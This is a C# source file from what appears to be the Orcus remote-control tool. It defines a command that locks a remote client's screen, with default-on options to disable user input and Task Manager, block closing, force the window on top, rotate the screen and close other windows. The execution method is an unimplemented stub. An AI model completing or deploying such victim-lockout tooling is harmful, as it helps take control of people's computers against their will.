using System;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.System
{
    public class SystemLockCommand : ActiveStaticCommand
    {
        public SystemLockCommand()
        {
            this.RegisterProperty(() => Message, Resources.StaticCommands.System_SystemLockCommand_Message,
                    Resources.StaticCommands.System_SystemLockCommand_Message_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => DisableUserInput,
                    Resources.StaticCommands.System_SystemLockCommand_DisableUserInput,
                    Resources.StaticCommands.System_SystemLockCommand_DisableUserInput_Description,
                    Resources.StaticCommands.Protection)
                .RegisterProperty(() => PreventClosing, Resources.StaticCommands.System_SystemLockCommand_PreventClosing,
                    Resources.StaticCommands.System_SystemLockCommand_PreventClosing_Description,
                    Resources.StaticCommands.Protection)
                .RegisterProperty(() => Topmost, Resources.StaticCommands.System_SystemLockCommand_Topmost,
                    Resources.StaticCommands.System_SystemLockCommand_Topmost_Description,
                    Resources.StaticCommands.Protection)
                .RegisterProperty(() => SetToTopPeriodically,
                    Resources.StaticCommands.System_SystemLockCommand_PeriodicallySetTopWindow,
                    Resources.StaticCommands.System_SystemLockCommand_PeriodicallySetTopWindow_Description,
                    Resources.StaticCommands.Protection)
                .RegisterProperty(() => DisableTaskManager,
                    Resources.StaticCommands.System_SystemLockCommand_DisableTaskManager,
                    Resources.StaticCommands.System_SystemLockCommand_DisableTaskManager_Description,
                    Resources.StaticCommands.Protection)
                .RegisterProperty(() => Background, Resources.StaticCommands.System_SystemLockCommand_Background,
                    Resources.StaticCommands.System_SystemLockCommand_Background_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => RotateScreen, Resources.StaticCommands.System_SystemLockCommand_RotateScreen,
                    Resources.StaticCommands.System_SystemLockCommand_RotateScreen_Description,
                    Resources.StaticCommands.Protection)
                .RegisterProperty(() => CloseOtherWindows,
                    Resources.StaticCommands.System_SystemLockCommand_CloseWindows,
                    Resources.StaticCommands.System_SystemLockCommand_CloseWindows_Description,
                    Resources.StaticCommands.Desktop)
                .RegisterProperty(() => UseDifferentDesktop,
                    Resources.StaticCommands.System_SystemLockCommand_DifferentDesktop,
                    Resources.StaticCommands.System_SystemLockCommand_DifferentDesktop_Description,
                    Resources.StaticCommands.Desktop);
        }

        public override Guid CommandId { get; } = new Guid(0x80e33ecc, 0xf449, 0xd84f, 0xb3, 0xff, 0x73, 0x7e, 0xec,
            0xcd, 0x73, 0x2b);

        public override string Name { get; } = Resources.StaticCommands.System_SystemLockCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.System_SystemLockCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.System;

        public string Message { get; set; }
        public bool DisableUserInput { get; set; } = true;
        public bool PreventClosing { get; set; } = true;
        public bool Topmost { get; set; } = true;
        public bool SetToTopPeriodically { get; set; } = true;
        public bool DisableTaskManager { get; set; } = true;
        public bool RotateScreen { get; set; } = true;
        public LockScreenBackground Background { get; set; } = LockScreenBackground.Black;
        public bool UseDifferentDesktop { get; set; } = true;
        public bool CloseOtherWindows { get; set; } = true;

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void StartExecute(CommandParameter commandParameter, IClientInfo clientInfo)
        {
            throw new NotImplementedException();
        }

        public enum LockScreenBackground
        {
            Black,
            White,
            Blue
        }
    }
}